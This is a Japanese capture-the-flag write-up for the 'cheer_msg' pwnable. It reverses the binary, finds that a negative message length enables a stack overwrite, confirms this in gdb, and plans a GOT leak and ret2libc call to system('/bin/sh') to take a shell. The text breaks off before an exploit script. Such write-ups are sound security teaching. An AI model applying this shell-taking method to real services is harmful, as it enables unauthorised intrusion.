@@ -1,0 +1,800 @@
+cheer_msg
+
+与えられるのはバイナリ本体とlibc、それとサービスが動作しているホストとポートのみ。
+
+Host: cheermsg.pwn.seccon.jp
+Port: 30527
+
+cheer_msg(SHA1:a89bdbaf3a918b589e14446f88d51b2c63cb219f)
+libc-2.19.29 (SHA1:c4dc1270c1449536ab2efbbe7053231f1a776368)
+
+問題ファイルダウンロード
+https://book.mynavi.jp/files/user/support/9784839962135/mondai4.zip
+
+
+まずはこのバイナリがどんなセキュリティ機構を持っているか調べる。
+ecksecを用いることで代表的なセキュリティ機構を確認することができる。
+
+% checksec --file=cheer_msg
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols              FORTIFY Fortified       Fortifiable  FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   79 Symbols     Yes   0               2       cheer_msg
+
+・Arch: x86の実行バイナリ
+・RELRO: Partial RELROであることからGOT Overwriteが可能
+・Stack: Canaryが存在しているため、スタックベースのバッファオーバーフローに対する抑止が有効
+・NX: 有効であるため、予め想定された以外のメモリに格納された機械語は実行できない
+
+
+次に、この実行バイナリがどのような動きをするものなのか把握する。
+リモートサーバで動いていることを想定して、socatを用いてポートを開き待ち受けることにする。
+
+% chmod u+x cheer_msg
+% socat -v tcp-listen:30527,fork,reuseaddrexec:./cheer_msg,stderr
+
+この操作で、localhostの30527番ポートにて問題が待ち受けている状態になる。
+ncコマンドでこれに接続し、動きを確認してみる。
+
+
+% nc localhost 30527
+Hello, I'm Nao.
+Give me your cheering messages :)
+
+Message Length >> 10
+Message >> hello!
+
+
+Oops! I forgot to ask your name...
+Can you tell me your name?
+
+Name >> shiftcrops
+
+Thank you shiftcrops!
+Message : hello!
+
+
+Naoへ応援メッセージを送るプログラムのよう。
+はじめにメッセージ長を訊かれるため、その長さを入力した後にメッセージを送る。
+最後に自分の名前を入力すれば終了。
+
+
+まずは最初に呼ばれるmain関数。
+初めの部分はお決まりの関数プロローグ。
+0x80485cdから0x80485d8までの間はスタックフレームの調整とスタックの確保を行っている。
+
+先の処理を終えると、printf関数で何かしらの文字列を表示する。
+0x80487e0以降に格納されている文字列は、Message Length>>までの文言。
+文字列を表示した後にはgetint関数を呼んでいる。
+数値を受け取る関数と予想できるが、後で解析する。
+
+このgetint関数からの戻り値(以下、入力値)をDWORDで[ebp-0x10]に格納し次のフェーズに移る。
+DWORDはメモリに対して読み書きを行うサイズを示す。
+BYTEは1byte単位、WORDで2byte、DWORDで4byteとなる。DWORDはDouble Wordを意味する。
+
+
+ 080485ca <main>:
+ 80485ca:       8d 4c 24 04             lea    ecx,[esp+0x4]
+ 80485ce:       83 e4 f0                and    esp,0xfffffff0
+ 80485d1:       ff 71 fc                push   DWORD PTR [ecx-0x4]
+ 80485d4:       55                      push   ebp
+ 80485d5:       89 e5                   mov    ebp,esp
+ 80485d7:       51                      push   ecx
+ 80485d8:       83 ec 24                sub    esp,0x24
+ 80485db:       c7 04 24 e0 87 04 08    mov    DWORD PTR [esp],0x80487e0
+ 80485e2:       e8 49 fe ff ff          call   8048430 <printf@plt>
+ 80485e7:       e8 21 01 00 00          call   804870d <getint>
+ 80485ec:       89 45 f0                mov    DWORD PTR [ebp-0x10],eax
+
+
+メモリの確保
+ 80485ef:       8b 45 f0                mov    eax,DWORD PTR [ebp-0x10]
+ 80485f2:       8d 50 0f                lea    edx,[eax+0xf]
+ 80485f5:       b8 10 00 00 00          mov    eax,0x10
+ 80485fa:       83 e8 01                sub    eax,0x1
+ 80485fd:       01 d0                   add    eax,edx
+ 80485ff:       b9 10 00 00 00          mov    ecx,0x10
+ 8048604:       ba 00 00 00 00          mov    edx,0x0
+ 8048609:       f7 f1                   div    ecx
+ 804860b:       6b c0 10                imul   eax,eax,0x10
+ 804860e:       29 c4                   sub    esp,eax
+ 8048610:       8d 44 24 08             lea    eax,[esp+0x8]
+ 8048614:       83 c0 0f                add    eax,0xf
+ 8048617:       c1 e8 04                shr    eax,0x4
+ 804861a:       c1 e0 04                shl    eax,0x4
+ 804861d:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
+
+レジスタの一時的な値の変化は無視して、やっていることをまとめると擬似的に次の2式に集約される。やっていることは[ebp-0x10]に格納されている入力値を基にespを操作したり、メモリに値を格納したりしているだけ。
+
+esp -= ((*(ebp-0x10) + 0x1e) / 0x10) * 0x10
+*(ebp-0xc) = ((esp + 0x17) >> 4) << 4
+
+espを減少させている大きさは、入力値に0x1eを足してから0x10単位に切り捨ててアラインしたもの。
+espを減少させるというのは、スタック上にメモリを確保したことを意味する。
+[ebp-0xc]には、上記の通り調整したespを基準にして0x17加え、再び0x10単位に切り捨てている。
+つまり[ebp-0xc]に格納される値は、getint関数によって得られた入力値を基にして、その分の大きさだけスタックに確保したメモリの先頭アドレスであることがわかる。(ただし、0x10byteアラインのために切り上げている)
+
+main関数では最後にmessage関数を呼んでいる。
+今回のプログラムのターゲットとなるアーキテクチャはx86であるため、第1引数は[esp]、第2引数は[esp+0x4]に保持してから関数は呼ばれる。このプログラムの場合、第1引数には計算して[ebp-0xc]に格納されていたメモリのアドレス、第2引数には[ebp-0x10]に格納されていた入力値が与えられている。
+
+
+ 8048620:       8b 45 f0                mov    eax,DWORD PTR [ebp-0x10]
+ 8048623:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
+ 8048627:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
+ 804862a:       89 04 24                mov    DWORD PTR [esp],eax
+ 804862d:       e8 0a 00 00 00          call   804863c <message>
+ 8048632:       c9                      leave
+ 8048633:       c3                      ret
+
+message関数から戻ってきたら、そのままleave命令でスタックの状態を元に戻し、ret命令でmain関数を抜ける。
+
+この関数にはcanaryによるスタックの保護が無い。
+下調べの段階ではcanary foundとなっていたが、canaryはコンパイラによって組み込まれるセキュリティ機構。スタックフレームの高位部分にランダムな値を配置しておくことで、もしこの値が破壊されていればスタックオーバーフローが起きたという事を検知することができる。
+コンパイラが「この関数ではオーバースタックフローが起こる可能性がある」と判断すると、その関数の先頭で「canaryをスタックに積む」コードとリターン直前に「canaryが書き換えられていないかチェックする」コードが自動で付加される。
+意図的にこの機構を無効にした場合は付加されない。
+今回のmain関数内では、ユーザからの入力を直接受け取ったり配列を扱ったりというような動作が存在していなかったため、コンパイラがcanaryは不要と判断した。
+
+
+message関数を読んでみると、printf関数とgetnline関数が交互に呼ばれている。
+main関数まででメッセージ長の入力までを受け取っていた。ここではそれ以後の処理が行われていることが予想できる。
+この関数を呼ぶにあたって、2つの引数を与えていた。メモリのアドレスとユーザーから与えられたメッセージ長。それぞれがどのように扱われているのか、重要な記述を中心に逆アセンブルした結果を読んで追っていく。
+
+まず、関数内で第1引数と第2引数はそれぞれ[ebp+0x8]と[ebp+0xc]で参照することができる。
+関数の初めの部分でさっそく第1引数が参照され、[ebp-0x5c]に移動されていることが分かる。
+以後、第1引数を利用する際にはここが参照される。
+本来であれば[ebp+0x8]を利用し続けても特に問題はないはずだが、わざわざ移動してこちらを使う。これもスタックオーバーフローを意識したコンパイラの配慮。第1引数で扱っている値は、この関数内ではポインタとして使用される。もし移動させずに高位アドレスに保持したまま利用していた場合、仮にスタックオーバーフローが起きるとポインタが書き換えられ任意アドレスの読み書きが可能になってしまう。該当関数のスタックフレーム内で、可能なかぎり底位アドレスにポインタを配置することで、オーバーフローによる書き換えを避けようという意図がある。
+
+1回目のgetnline関数の呼び出しを見る。
+こちらはメッセージの入力に該当する。message関数の第1引数と第2引数が、全く状態を変えずにそのままgetnline関数に渡していることが分かる。getnline関数についても後述するが、この関数は指定された文字数だけユーザーから入力を受け取って、与えられたアドレスに対して格納するという動きをする。
+
+0804863c <message>:
+
+ 8048642:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
+ 8048645:       89 45 a4                mov    DWORD PTR [ebp-0x5c],eax
+
+ 804865f:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
+ 8048662:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
+ 8048666:       8b 45 a4                mov    eax,DWORD PTR [ebp-0x5c]
+ 8048669:       89 04 24                mov    DWORD PTR [esp],eax
+ 804866c:       e8 4c 00 00 00          call   80486bd <getnline>
+
+次に2回目のgetnline関数の呼び出し。名前の入力に該当する。
+今度は0x40byteだけ入力を受け取り、[ebp-0x4c]以降に格納している。
+
+ 804867d:       c7 44 24 04 40 00 00    mov    DWORD PTR [esp+0x4],0x40
+ 8048684:       00
+ 8048685:       8d 45 b4                lea    eax,[ebp-0x4c]
+ 8048688:       89 04 24                mov    DWORD PTR [esp],eax
+ 804868b:       e8 2d 00 00 00          call   80486bd <getnline>
+
+この関数ではエピローグ部とプロローグ部でcanaryに関する処理がしっかりと入っており、canaryは[ebp-0xc]に配置されている。2回目に文字が読み込まれるメモリの先頭アドレスからcanaryまでのオフセットは0x40byteであるため、getnline関数が制限文字数を守らないなどの変な動きをしないかぎり、ここではスタックオーバーフローは起こらない。
+
+ここからはユーザー入力を扱う関数について見ていく。
+まずは文字列を受け取る役割を担っているgetnline関数。中身を読んでみる。
+ほとんどただのfgets関数のラッパーのようである。0x804a040はstdinであり、fgets関数によって指定された文字数だけ標準入力からメモリに読み込みを行う。
+
+
+080486bd <getnline>:
+ 80486bd:       55                      push   ebp
+ 80486be:       89 e5                   mov    ebp,esp
+ 80486c0:       83 ec 28                sub    esp,0x28
+ 80486c3:       a1 40 a0 04 08          mov    eax,ds:0x804a040
+ 80486c8:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
+ 80486cc:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
+ 80486cf:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
+ 80486d3:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
+ 80486d6:       89 04 24                mov    DWORD PTR [esp],eax
+ 80486d9:       e8 62 fd ff ff          call   8048440 <fgets@plt>
+
+文字列を受け取ったのち、その文字列中に存在している最初の改行文字をstrchr関数を用いて見つけ出し、そこをヌル文字に置き換えるという処理が存在している。
+これは、入力された文字列の中に改行文字が含まれていた場合、fgets関数はそこまで含めてメモリに読み込みを行うため。
+
+80486de:       c7 44 24 04 0a 00 00    mov    DWORD PTR [esp+0x4],0xa
+ 80486e5:       00
+ 80486e6:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
+ 80486e9:       89 04 24                mov    DWORD PTR [esp],eax
+ 80486ec:       e8 7f fd ff ff          call   8048470 <strchr@plt>
+ 80486f1:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
+ 80486f4:       83 7d f4 00             cmp    DWORD PTR [ebp-0xc],0x0
+ 80486f8:       74 06                   je     8048700 <getnline+0x43>
+ 80486fa:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
+ 80486fd:       c6 00 00                mov    BYTE PTR [eax],0x0
+
+解析を行う最後の関数はgetint関数。IntegerをGetする関数。
+内部的には0x40byteだけスタックを確保し、そこに直前に説明したgetnline関数を利用してユーザー入力を受け取っている。受け取った文字列をatoi関数に渡すことでそれを数値に変換し、この関数の戻り値としてその値をそのまま返している。
+
+ 804871e:       c7 44 24 04 40 00 00    mov    DWORD PTR [esp+0x4],0x40
+ 8048725:       00
+ 8048726:       8d 45 b4                lea    eax,[ebp-0x4c]
+ 8048729:       89 04 24                mov    DWORD PTR [esp],eax
+ 804872c:       e8 8c ff ff ff          call   80486bd <getnline>
+ 8048731:       8d 45 b4                lea    eax,[ebp-0x4c]
+ 8048734:       89 04 24                mov    DWORD PTR [esp],eax
+ 8048737:       e8 64 fd ff ff          call   80484a0 <atoi@plt>
+
+
+ここからはプログラムの脆弱性を探っていく。
+まず最初に考えられるバグといえば、ユーザーからの入力文字数に対する制限が正しく行われない可能性が挙げられる。
+gets関数の利用やscanf関数における"%s"による読み込みなど。もしこれらが使われていた場合は、改行文字やEOFが来るまで無制限に入力を受け取ってしまうので容易にバッファオーバーフローが引き起こされる。しかし、今回の問題ではfgets関数を用いており、適切な制限をかけることが可能なためこの線はない。
+次に、用意したバッファサイズよりも制限をかけた読み込みバイト数が大きい場合がないか確認する。
+getnline関数を呼んでいるのはmessage関数の2ヶ所とgetint関数の1ヶ所に限られる。このうち、message関数での2回目とgetint関数からの呼び出しはそれぞれの関数解析時に確認した通り、バッファサイズも読み込み制限も共に0x40byteであり、オーバーフローする危険性はない。最後にmessage関数での1回目の呼び出しについて、ここで使用されるバッファとサイズはmain関数で入力したメッセージ長に依る。メッセージ長に合わせてespを減らして動的にスタックを確保しているため、ここも溢れる気配はなさそうである。
+一見するとこのプログラムではスタックが溢れることはないように思う。
+しかし、もう一度解析結果を読み直すと、「main関数におけるスタックの動的確保」の部分の処理において、チェックが甘いことに気づく。
+もしここに負数を与えたらどのような動きをするか。
+
+逆アセンブルした結果のコードを見たかぎりでは、入力値の正負を判定するような機構は存在していない。これは明らかに数値チェックミスのバグ。たとえ負数を与えた場合でも、スタック確保の部分は問題なく処理されてしまうと考えられる。もちろんそれは正しくスタックが確保されるということではなく、なにかしら変な動きをしながらも処理は進んでしまうという意味。
+
+
+バグの見当は付いたが、これが攻撃につながり得るものであるかどうか判断することはできない。実際に負数をメッセージ長として入力に与えてプログラムの動作を確認する。
+
+main関数に入り、スタックにメモリの確保をした直後の状態。このとき、espは0xffffd5a0を指している。
+
+gdb-peda$ start
+[----------------------------------registers-----------------------------------]
+EAX: 0xf7fb4548 --> 0xffffd67c --> 0xffffd7c4 ("XDG_SESSION_ID=2")
+EBX: 0x0
+ECX: 0xffffd5e0 --> 0x1
+EDX: 0xffffd604 --> 0x0
+ESI: 0xf7fb2000 --> 0x1d6d6c
+EDI: 0xf7fb2000 --> 0x1d6d6c
+EBP: 0xffffd5c8 --> 0x0
+ESP: 0xffffd5a0 --> 0xf7fb23fc --> 0xf7fb3980 --> 0x0
+EIP: 0x80485db (<main+17>:      mov    DWORD PTR [esp],0x80487e0)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80485d5 <main+11>: mov    ebp,esp
+   0x80485d7 <main+13>: push   ecx
+   0x80485d8 <main+14>: sub    esp,0x24
+=> 0x80485db <main+17>: mov    DWORD PTR [esp],0x80487e0
+   0x80485e2 <main+24>: call   0x8048430 <printf@plt>
+   0x80485e7 <main+29>: call   0x804870d <getint>
+   0x80485ec <main+34>: mov    DWORD PTR [ebp-0x10],eax
+   0x80485ef <main+37>: mov    eax,DWORD PTR [ebp-0x10]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd5a0 --> 0xf7fb23fc --> 0xf7fb3980 --> 0x0
+0004| 0xffffd5a4 --> 0x40000
+0008| 0xffffd5a8 --> 0x1
+0012| 0xffffd5ac --> 0x80487a2 (<__libc_csu_init+82>:   add    edi,0x1)
+0016| 0xffffd5b0 --> 0x1
+0020| 0xffffd5b4 --> 0xffffd674 --> 0xffffd7a8 ("/home/ctf/ctf/m04/cheer_msg")
+0024| 0xffffd5b8 --> 0xffffd67c --> 0xffffd7c4 ("XDG_SESSION_ID=2")
+0028| 0xffffd5bc --> 0xf7e10805 (<__cxa_atexit+37>:     add    esp,0x1c)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080485db in main ()
+
+
+まずはプログラムが入力を想定している正数（例では128）を与えた時のスタックの動きを確認する。
+このときespは減少し、0xffffd510となる。
+また[ebp-0xc]には、現在eaxに格納されている0xffffd520がセットされることが読み取れる。
+0xffffd5a0 - 0xffffd520 = 0x80（=128）であることから、確かにスタック上にメモリが確保され、そのサイズはユーザーが入力した値であることがわかる。
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd520 --> 0xffffd54c --> 0x383231 ('128')
+EBX: 0x0
+ECX: 0x10
+EDX: 0xe
+ESI: 0xf7fb2000 --> 0x1d6d6c
+EDI: 0xf7fb2000 --> 0x1d6d6c
+EBP: 0xffffd5c8 --> 0x0
+ESP: 0xffffd510 --> 0xffffd54c --> 0x383231 ('128')
+EIP: 0x804861d (<main+83>:      mov    DWORD PTR [ebp-0xc],eax)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048614 <main+74>: add    eax,0xf
+   0x8048617 <main+77>: shr    eax,0x4
+   0x804861a <main+80>: shl    eax,0x4
+=> 0x804861d <main+83>: mov    DWORD PTR [ebp-0xc],eax
+   0x8048620 <main+86>: mov    eax,DWORD PTR [ebp-0x10]
+   0x8048623 <main+89>: mov    DWORD PTR [esp+0x4],eax
+   0x8048627 <main+93>: mov    eax,DWORD PTR [ebp-0xc]
+   0x804862a <main+96>: mov    DWORD PTR [esp],eax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd510 --> 0xffffd54c --> 0x383231 ('128')
+0004| 0xffffd514 --> 0x0
+0008| 0xffffd518 --> 0xa ('\n')
+0012| 0xffffd51c --> 0xf7e0ee80 (<atoi>:        sub    esp,0x10)
+0016| 0xffffd520 --> 0xffffd54c --> 0x383231 ('128')
+0020| 0xffffd524 --> 0xf7ffd950 --> 0x0
+0024| 0xffffd528 --> 0x40 ('@')
+0028| 0xffffd52c --> 0x804873c (<getint+47>:    mov    edx,DWORD PTR [ebp-0xc])
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804861d in main ()
+
+次に負数である-128を与えてみる。その結果、今度はespが増加し0xffffd610になる。
+eaxには0xffffd620が格納されており、いずれも元の0xffffd5a0よりも高位のアドレスを指している。
+
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd620 --> 0x0
+EBX: 0x0
+ECX: 0x10
+EDX: 0xe
+ESI: 0xf7fb2000 --> 0x1d6d6c
+EDI: 0xf7fb2000 --> 0x1d6d6c
+EBP: 0xffffd5c8 --> 0x0
+ESP: 0xffffd610 --> 0x0
+EIP: 0x804861d (<main+83>:      mov    DWORD PTR [ebp-0xc],eax)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048614 <main+74>: add    eax,0xf
+   0x8048617 <main+77>: shr    eax,0x4
+   0x804861a <main+80>: shl    eax,0x4
+=> 0x804861d <main+83>: mov    DWORD PTR [ebp-0xc],eax
+   0x8048620 <main+86>: mov    eax,DWORD PTR [ebp-0x10]
+   0x8048623 <main+89>: mov    DWORD PTR [esp+0x4],eax
+   0x8048627 <main+93>: mov    eax,DWORD PTR [ebp-0xc]
+   0x804862a <main+96>: mov    DWORD PTR [esp],eax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd610 --> 0x0
+0004| 0xffffd614 --> 0xc6db86d2
+0008| 0xffffd618 --> 0x865f00c2
+0012| 0xffffd61c --> 0x0
+0016| 0xffffd620 --> 0x0
+0020| 0xffffd624 --> 0x0
+0024| 0xffffd628 --> 0x1
+0028| 0xffffd62c --> 0x80484b0 (<_start>:       xor    ebp,ebp)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804861d in main ()
+
+
+この動作の何が問題かというと、それはスタックの高位に格納された任意の変数やリターンアドレスなどを自由に改竄することができる可能性がある、という点。
+元よりも高位のスタックを起点に文字列を読み込むことが出来る場合には、本来は到達することのできなかったはずのアドレスのメモリに対して書き込みが行われるということになる。また、そうでなくてもこの後に別の関数が呼ばれれば、スタックフレーム同士の一部が重なり合い、局所変数にアクセスすることで呼び出し元の関数の局所変数を書き換えることもできる。
+
+以上により、本問題ではスタックに保存されたリターンアドレスを書き換え、ROPに繋げることができる。
+
+発見したバグを検証した結果、これは攻撃に使える脆弱性であるということが明らかになった。続いて、この脆弱性を突いてフラグを得る方針を固める。
+
+
+今回は、サービスが稼働しているサーバのアドレスとポートが渡されて、そこに接続をしてフラグを得るというリモート型のPwnable問題。このようなリモート型問題では、解き方に大きく分けて2つの種類がある。
+まず、通常の動作でフラグをメモリ内に保持するようなプログラムについては、そこからデータを読み出して出力させれば終了。次に、先述のような機能が無いバイナリについては、bashなどのシェルを立ち上げてフラグが書き込まれているファイルを見つけることになる。
+このような作業を「シェルを奪う」と言う。本問題は後者にあたるため、シェルを奪う方法を考える必要がある。
+
+
+
+・攻撃手法の確定
+自由にシステムコールが発行できる状態であれば、シェルコードを流し込んでsys_execveを呼べば済む。しかし、今回は下調べで確認した通りNXが有効であるため、この方法は難しい。
+もし問題バイナリ内でsystem関数だったりexecve関数だったりを使っているのであれば、Procedure Linkage Table(PLT)にそれらを解決するためのエントリが存在しているので、そこを経由して目的の関数を呼び出す。この手法はReturn to PLT(ret2plt)と呼ばれる。そうでなくても、直接libc内に存在している関数を呼び出すReturn to libc(ret2libc)という手法も存在している。この問題のバイナリ中では該当する関数を利用していないようなので、ret2libcを行う必要がある。
+
+・攻撃のために必要な情報
+ret2libcを行うためには、呼び出したい関数が配置されているアドレスが必要になる。
+libc自体がマッピングされているアドレスと、libc内で対象の関数が存在しているオフセットが判明すればこれを求めることができる。
+
+libcがマッピングされているベースアドレスを特定するのは単純ではない。これはプログラムを実行するたびに変化するため、何かしらの手段を用いて毎回求めなければならない。
+このように、プロセスのアドレス空間レイアウトが実行のたびに変化するセキュリティ機構をAddress Space Layout Randomization(ASLR)と呼ぶ。ASLRでは共有ライブラリのみならず、スタックやヒープ、更にはバイナリ本体のPIEが有効だった場合はそれ自身がマッピングされるアドレスも変化する。
+この機構によって、攻撃者が目的の情報が配置されているアドレスを特定するのを困難にしている。
+
+libcのベースアドレスはGlobal Offset Table(GOT)を参照することで特定することができる。GOTには一度解決したシンボルのアドレスが格納されている。ここから既に一度は呼ばれている適当な関数のアドレスをリークし、オフセットを減じることでベースアドレスが求まる。
+
+libc内での関数のオフセットはnmコマンドを用いることで調べることができる。
+この結果から、system関数のオフセットは0x00040310であることがわかる。
+
+% nm -D libc-2.19.so | grep system
+00040310 T __libc_system
+001193c0 T svcerr_systemerr
+00040310 W system
+
+
+・攻撃の流れ
+system関数の位置を特定する方法が分かれば、特定したアドレスを使って実際にsystem関数を呼ぶ方法を考えていく。
+今回の脆弱性は、スタックに保存されたリターンアドレスを書き換えてROPに繋げることができるもの。アドレスリークをしたのち、読み込み系の関数を駆使してROPを継続してもいいが、一番手っ取り早いのは脆弱性のある関数を再び呼び出す、ということ。同じようにしてまたROPに持ち込めば、今度こそsystem関数の呼び出しを行うことができる。
+
+このプログラムを攻撃してシェルを奪う流れは以下の通りとなる。
+1.メッセージ長に負数を与えて、main関数のリターンアドレスを書き換え可能な状態にする
+2.ROP chainを組んで、ret2pltでGOTから適当な関数のアドレスをリークする(リーク後は再びmain関数に戻るようにする)
+3.再び1.を行う
+4.ROP chainを組んで、ret2libcでsystem関数を呼び出す(引数は"/bin/sh"が格納されているアドレス)
+
+この流れをなぞって、exploitコードを書いていく。
+
+
+・Eploitの作成
+Pythonを使ってexploitコードを書いていく。
+作成にあたっては、GallopsledというCTFチームが公開しているpwntoolsというライブラリを用いる。
+このライブラリには自動でシンボルを解決したり、ROP chainを組んでくれたりと様々な便利な機能が備わっている。
+
+1.任意のアドレスに処理を飛ばす
+まずはリターンアドレスを書き換えてみる。
+メッセージ長に負数を与えた後にメッセージを入れてもスタックは壊せず、メッセージを入れる間もなく名前の入力に処理が飛ぶ。
+getnline関数の動作は、メッセージ長で指定した長さだけ標準入力から文字を受け取るため、負数を与えれば1文字も受け取れない。試しにltraceコマンドを実行し、プログラムが呼び出した共有ライブラリの関数を追ってみる。
+
+$ ltrace -i ./cheer_msg
+[0x80484d1] __libc_start_main(0x80485ca, 1, 0xffc643c4, 0x8048750 <unfinished ...>
+[0x80485c8] setbuf(0xf7f18d80, 0)                        = <void>
+[0x80485e7] printf("Hello, I'm Nao.\nGive me your che"...Hello, I'm Nao.
+Give me your cheering messages :)
+
+Message Length >> ) = 69
+[0x80486de] fgets(-128
+"-128\n", 64, 0xf7f185c0)              = 0xffc6429c
+[0x80486f1] strchr("-128\n", '\n')                       = "\n"
+[0x804870b] strlen("-128")                               = 4
+[0x804873c] atoi(0xffc6429c, 64, 0xf7f33410, 1)          = 0xffffff80
+[0x804865f] printf("Message >> "Message >> )                        = 11
+[0x80486de] fgets("", -128, 0xf7f185c0)                  = 0
+[0x80486f1] strchr("", '\n')                             = nil
+[0x804870b] strlen("")                                   = 0
+[0x804867d] printf("\nOops! I forgot to ask your name"...
+Oops! I forgot to ask your name...
+Can you tell me your name?
+
+Name >> ) = 72
+[0x80486de] fgets(
+
+0x80486deにおけるfgets関数の呼び出しで、文字長を指定する第2引数が負数であることから、この関数は1文字も受け取らずに返っていることがわかる。
+(表示されるスタックアドレスなどは、ASLRの影響で環境によって異なる)
+メッセージの入力ではスタックのデータを破壊することはできない。残るは名前の入力部。名前の入力を行う関数のスタックフレームは、main関数のスタックフレームにオーバーラップできることは既に判明している。メッセージ長に与える負数は適当にやってもいつかは当たるかもしれないが、ここはしっかりと解析して定める。
+
+メッセージ長を0とした場合の、入力した名前が書き込まれる領域とmain関数のリターンアドレスが配置されている領域とのオフセットを求める。ここでは、gdbの配下でASLRを無効にした状態で調査を行う。
+main関数に突入し、関数プロローグが終わった時点でブレークする。ebpが0xffffd5c8を指していることから、リターンアドレスが記録されているアドレスは0xffffd5ccであることがわかる。ここにはlibcからmain関数を呼び出した__libc_start_main関数へのリターンアドレスが書き込まれているのが確認できる。
+
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xf7fb4548 --> 0xffffd67c --> 0xffffd7c4 ("XDG_SESSION_ID=2")
+EBX: 0x0
+ECX: 0xffffd5e0 --> 0x1
+EDX: 0xffffd604 --> 0x0
+ESI: 0xf7fb2000 --> 0x1d6d6c
+EDI: 0xf7fb2000 --> 0x1d6d6c
+EBP: 0xffffd5c8 --> 0x0
+ESP: 0xffffd5c4 --> 0xffffd5e0 --> 0x1
+EIP: 0x80485d8 (<main+14>:      sub    esp,0x24)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80485d4 <main+10>: push   ebp
+   0x80485d5 <main+11>: mov    ebp,esp
+   0x80485d7 <main+13>: push   ecx
+=> 0x80485d8 <main+14>: sub    esp,0x24
+   0x80485db <main+17>: mov    DWORD PTR [esp],0x80487e0
+   0x80485e2 <main+24>: call   0x8048430 <printf@plt>
+   0x80485e7 <main+29>: call   0x804870d <getint>
+   0x80485ec <main+34>: mov    DWORD PTR [ebp-0x10],eax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd5c4 --> 0xffffd5e0 --> 0x1
+0004| 0xffffd5c8 --> 0x0
+0008| 0xffffd5cc --> 0xf7df97e1 (<__libc_start_main+241>:       add    esp,0x10)
+0012| 0xffffd5d0 --> 0xf7fb2000 --> 0x1d6d6c
+0016| 0xffffd5d4 --> 0xf7fb2000 --> 0x1d6d6c
+0020| 0xffffd5d8 --> 0x0
+0024| 0xffffd5dc --> 0xf7df97e1 (<__libc_start_main+241>:       add    esp,0x10)
+0028| 0xffffd5e0 --> 0x1
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Temporary breakpoint 1, 0x080485d8 in main ()
+
+
+次にメッセージ長に0を与え、名前を入力するためのgetnline関数が呼ばれる直前にブレークを仕掛ける。getnline関数に与えられた第1引数は0xffffd53cであることから、入力した名前はここに格納される。
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd53c --> 0x1
+EBX: 0x0
+ECX: 0xffffafcc ("\nOops! I forgot to ask your name...\nCan you tell me your name?\n\nName >> ")
+EDX: 0xf7fb4010 --> 0x0
+ESI: 0xf7fb2000 --> 0x1d6d6c
+EDI: 0xf7fb2000 --> 0x1d6d6c
+EBP: 0xffffd588 --> 0xffffd5c8 --> 0x0
+ESP: 0xffffd520 --> 0xffffd53c --> 0x1
+EIP: 0x804868b (<message+79>:   call   0x80486bd <getnline>)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804867d <message+65>:      mov    DWORD PTR [esp+0x4],0x40
+   0x8048685 <message+73>:      lea    eax,[ebp-0x4c]
+   0x8048688 <message+76>:      mov    DWORD PTR [esp],eax
+=> 0x804868b <message+79>:      call   0x80486bd <getnline>
+   0x8048690 <message+84>:      mov    eax,DWORD PTR [ebp-0x5c]
+   0x8048693 <message+87>:      mov    DWORD PTR [esp+0x8],eax
+   0x8048697 <message+91>:      lea    eax,[ebp-0x4c]
+   0x804869a <message+94>:      mov    DWORD PTR [esp+0x4],eax
+Guessed arguments:
+arg[0]: 0xffffd53c --> 0x1
+arg[1]: 0x40 ('@')
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd520 --> 0xffffd53c --> 0x1
+0004| 0xffffd524 --> 0x40 ('@')
+0008| 0xffffd528 --> 0x40 ('@')
+0012| 0xffffd52c --> 0xffffd5a0 --> 0x80487e0 ("Hello, I'm Nao.\nGive me your cheering messages :)\n\nMessage Length >> ")
+0016| 0xffffd530 --> 0xffffd54c --> 0x30 ('0')
+0020| 0xffffd534 --> 0x40 ('@')
+0024| 0xffffd538 --> 0xf7fcd410 --> 0x8048332 ("GLIBC_2.0")
+0028| 0xffffd53c --> 0x1
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804868b in message ()
+
+gdb-peda$ p 0xffffd5cc - 0xffffd53c
+$380 = 0x90
+
+
+オフセットは単純な引き算で求められる。
+0xffffd5cc - 0xffffd53c = 0x90 (=144)
+より、名前が書き込まれる領域とmain関数のリターンアドレスが配置されている領域とのオフセットは144byteであることが分かった。つまり、144byte分だけmessage関数のスタックフレームを高位に動かしてやれば、名前の入力によってmain関数のリターンアドレスを改竄できる。
+
